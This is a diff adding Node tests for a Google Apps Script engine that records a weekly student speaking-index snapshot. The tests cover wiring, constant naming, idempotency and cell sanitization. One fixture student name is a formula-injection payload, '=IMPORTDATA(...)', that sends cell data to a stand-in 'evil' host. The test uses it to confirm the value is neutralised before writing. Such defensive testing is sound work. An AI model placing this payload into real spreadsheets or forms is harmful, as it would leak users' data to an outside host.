@@ -534,3 +534,136 @@ test('출석 원본은 실행당 1회만 읽는다(반 18개 × 전체 읽기 �
   assert.ok(!코드만(idx).includes("getSheetByName('attendance')"),
     '발화 지수가 attendance를 직접 읽는다 — 캐시를 우회하면 반마다 전체 읽기가 된다');
 });
+
+/* ── ⑨ [vNEXT] 결과 저장 — 재고 버리던 발화 지수를 남긴다(세계판 대조 08-14: 말하기 평가의 결과가 안 남는 칸) ── */
+
+test('발화 지수 스냅샷이 weeklyJobs에 배선돼 있고, 리포트 섹션 실행보다 먼저 적재한다', () => {
+  // 만들어만 두고 아무도 안 부르는 상태 차단(v9.90 ROLE_TALK 사고 계열) + 순서: 소비자(weeklyReport)가 같은 실행에서 낡은 로그를 읽지 않게
+  const wj = section('function weeklyJobs()', '\n}');
+  const snapAt = wj.indexOf("safeRun('talkIndexSnapshot'");
+  assert.ok(snapAt > -1, 'weeklyJobs가 talkIndexSnapshot_를 부르지 않는다 — 로그가 영원히 빈다');
+  const secAt = wj.indexOf('const sections = [');
+  assert.ok(secAt > -1, 'weeklyJobs 섹션 배열 표식을 찾지 못함');
+  assert.ok(snapAt < secAt, '스냅샷 적재가 리포트 섹션 실행 뒤에 있다 — 주간 리포트 꼬리가 지난주 로그를 읽는다');
+});
+
+test('주간 리포트 꼬리가 talk_index_log를 읽는다 — 소비자 0이면 저장은 미완성(수집은 도달까지가 한 벌)', () => {
+  const wr = section('function weeklyReport(', '\n}');
+  assert.ok(/getSheetByName\(TALK_INDEX_LOG_SHEET\)/.test(wr), '주간 리포트가 발화 지수 로그를 읽지 않는다');
+  assert.ok(wr.includes('전주'), '전주 대비가 없다 — 저장의 존재 이유(궤적)를 소비자가 안 쓴다');
+  // 시트 이름은 상수 하나에서 파생 — 리터럴이 두 곳이면 언젠가 갈라진 쪽이 조용히 빈 시트를 읽는다
+  assert.equal((코드정제.match(/'talk_index_log'/g) || []).length, 1,
+    "시트 이름 리터럴 'talk_index_log'가 상수 선언 밖에도 있다 — 이름이 갈라진다");
+  const snap = section('function talkIndexSnapshot_(', '/* [v9.99] 학생용 오늘의 만남');
+  assert.ok(/ensureSheet\(ss, TALK_INDEX_LOG_SHEET, TALK_INDEX_LOG_HEADERS\)/.test(snap), '스냅샷이 상수로 시트를 보장하지 않는다');
+});
+
+test('발화 지수 로그 상수 이름이 회화 로그(talk_log)와 안 겹친다 — 전역 const 재선언은 라이브를 통째로 죽인다', () => {
+  /* 실측 08-14: 처음 이 상수를 `TALK_LOG_HEADERS` 로 지었더니 엔진_수집.js 의 회화 로그 상수와 충돌했다.
+   *   node --check 는 **파일 단위**라 초록이었고, Apps Script 는 전역을 합쳐 초기화하므로 라이브만 죽는다
+   *   (「테스트는 통과하는데 라이브만 죽는다」의 그 계급 — tests/_engine-source.js 머리말 2번과 같은 사고).
+   *   여기서는 이름 겹침을 직접 센다 — 합본 평가 검사(월키원인차단)는 다른 파일이라 이 파일만 보는 사람이 못 본다. */
+  ['TALK_INDEX_LOG_SHEET', 'TALK_INDEX_LOG_HEADERS'].forEach((n) => {
+    const decl = (code.match(new RegExp('const ' + n + '\\s*=', 'g')) || []).length;
+    assert.equal(decl, 1, `엔진 전역에 const ${n} 선언이 ${decl}개다 — 1개여야 한다(재선언=프로젝트 전체 SyntaxError)`);
+  });
+});
+
+test('스냅샷 쓰기가 공용 소독 통로를 탄다 — 이름이 «=»로 시작하면 셀이 라이브 수식이 된다', () => {
+  /* 반·student_id·이름은 상담시트·폼에서 온 남의 글이 profiles→groups 를 거쳐 흘러온 원문이다.
+   *   앞단에서 붙인 아포스트로피는 저장 때 소비돼 getValues 가 원문을 돌려주므로(Code.js:1036) 여기서 다시 굳는다.
+   *   append 형 로그의 선례(lesson_close·lecture_view)와 같은 통로여야 한다. */
+  const snap = section('function talkIndexSnapshot_(', '/* [v9.99] 학생용 오늘의 만남');
+  assert.ok(/setValues\(행소독_\(/.test(snap),
+    '스냅샷이 맨몸 setValues 로 쓴다 — 학생 이름 칸의 =IMPORTDATA 가 시트에서 살아난다');
+});
+
+// 스냅샷 함수를 실제로 실행한다 — 문구 검사로는 멱등(재실행 안전)을 못 잡는다
+function loadSnapshot() {
+  const src = section("const TALK_INDEX_LOG_SHEET = 'talk_index_log'", '/* [v9.99] 학생용 오늘의 만남');
+  const names = ['seasonStartOf_', 'seasonWeekOf_', 'seasonLabelOf_', 'SEASON_WEEKS',
+    'ensureSheet', 'quietScoreMap_', 'talkIndexOf_', 'Logger', '행소독_'];
+  return (stub) => new Function(...names, `${src}\nreturn talkIndexSnapshot_;`)(...names.map((n) => stub[n]));
+}
+
+/* 시트를 흉내 낼 때 «아포스트로피 소비»까지 흉내 낸다 — 실제 Sheets 는 저장 시 접두 `'`를 먹고
+ *   getValues 가 원문을 돌려준다(Code.js:1036). 그걸 안 흉내 내면 소독을 켠 순간 멱등 키가 갈려
+ *   테스트만 빨개지거나(거짓 적색) 반대로 실제 위험을 못 본다. */
+function fakeLogSheet() { // 헤더 1행 가정 — data는 2행부터의 실데이터만 담는다
+  const 저장 = (v) => (typeof v === 'string' && v[0] === "'" ? v.slice(1) : v);
+  return {
+    data: [],
+    raw: [],   // Sheets 에 «건넨» 원본 — 저장 후엔 아포스트로피가 소비돼 안 보이므로 따로 잡아 둔다
+    getLastRow() { return this.data.length + 1; },
+    getRange(r, c, n, w) {
+      const self = this;
+      return {
+        getValues() { return self.data.slice(r - 2, r - 2 + n).map((row) => row.slice(c - 1, c - 1 + w)); },
+        setValues(v) {
+          v.forEach((row, i) => { self.raw.push(row.slice()); self.data[r - 2 + i] = row.map(저장); });
+        }
+      };
+    }
+  };
+}
+
+function snapshotRig() {
+  const pfRows = [['S1', '바트', '', 'student', '평일11A'], ['S2', '사란', '', 'student', '평일11A']];
+  const pfSheet = {
+    getLastRow: () => pfRows.length + 1,
+    getRange: (r, c, n, w) => ({ getValues: () => pfRows.slice(r - 2, r - 2 + n).map((row) => row.slice(c - 1, c - 1 + w)) })
+  };
+  const log = fakeLogSheet();
+  let ensureCalls = 0, capturedHeaders = null;
+  const rig = {
+    log,
+    ensureCalls: () => ensureCalls,
+    headers: () => capturedHeaders,
+    ss: { getSheetByName: (n) => (n === 'profiles' ? pfSheet : null), getSpreadsheetTimeZone: () => 'Asia/Ulaanbaatar' },
+    stub: {
+      seasonStartOf_: () => new Date(2027, 0, 4),
+      seasonWeekOf_: () => 2,
+      seasonLabelOf_: () => '2027-01-04',
+      SEASON_WEEKS: G.SEASON_WEEKS,
+      ensureSheet: (ss2, name, headers) => { ensureCalls++; capturedHeaders = headers; return log; },
+      quietScoreMap_: () => ({}),
+      talkIndexOf_: () => [
+        // 첫 학생 이름은 폼에서 온 「남의 글」 — 상담시트에 이렇게 적히면 profiles→groups 를 거쳐 그대로 흘러온다
+        { sid: 'S1', name: '=IMPORTDATA("https://evil/?d="&A1)', grp: 1, got: 3, max: 6, quiet: 0, pct: 50 },
+        { sid: 'S2', name: '사란', grp: 1, got: 6, max: 6, quiet: 0, pct: 100 },
+        { sid: 'S9', name: '신입', grp: 1, got: 0, max: 0, quiet: 0, pct: 0 } // 아직 잴 차시 없음 — 행 금지
+      ],
+      Logger: { log() {} },
+      // 실물과 같은 규약(Code.js 행소독_ → 셀안전_): 문자열만 소독, Date·number 는 타입 보존
+      행소독_: (rows) => rows.map((r) => r.map((v) =>
+        (typeof v === 'string' && /^[=+\-@\t\r]/.test(v) ? "'" + v : v)))
+    }
+  };
+  return rig;
+}
+
+test('스냅샷은 멱등이다 — 같은 (시즌·주차) 재실행이 행을 늘리지 않는다', () => {
+  const rig = snapshotRig();
+  const snap = loadSnapshot()(rig.stub);
+  const out1 = snap(rig.ss);
+  assert.equal(rig.log.data.length, 2, 'max=0 학생을 빼고 2행이어야 한다: ' + rig.log.data.length);
+  assert.ok(out1.includes('신규 2행'), '요약이 신규 행 수를 말하지 않는다: ' + out1);
+  assert.equal(rig.log.data[0].length, rig.headers().length, '행 폭이 헤더 폭과 다르다 — 열이 밀린다');
+  // 소독은 «건네는 값»에서 확인한다 — 저장 후엔 시트가 아포스트로피를 먹어 원문으로 돌아온다
+  assert.equal(rig.log.raw[0][5], "'=IMPORTDATA(\"https://evil/?d=\"&A1)",
+    '이름 칸이 소독 없이 시트로 갔다 — 그 셀은 라이브 수식이 된다');
+  assert.equal(rig.log.data[0][5], '=IMPORTDATA("https://evil/?d="&A1)',
+    '왕복값이 원문이 아니다 — 시트의 아포스트로피 소비 규약과 어긋난다');
+  const out2 = snap(rig.ss);
+  assert.equal(rig.log.data.length, 2, '재실행이 행을 복제했다: ' + rig.log.data.length);
+  assert.ok(out2.includes('신규 0행') && out2.includes('중복 스킵 2행'),
+    '재실행 요약이 0을 분모와 함께 말하지 않는다: ' + out2);
+});
+
+test('시즌 미설정이면 시트를 만들지도 쓰지도 않는다 (개원 전 무소음)', () => {
+  const rig = snapshotRig();
+  rig.stub.seasonStartOf_ = () => null;
+  const out = loadSnapshot()(rig.stub)(rig.ss);
+  assert.ok(out.includes('적재 없음'), '시즌 미설정인데 적재를 시도한다: ' + out);
+  assert.equal(rig.ensureCalls(), 0, '시즌 미설정인데 시트를 만들었다');
+});
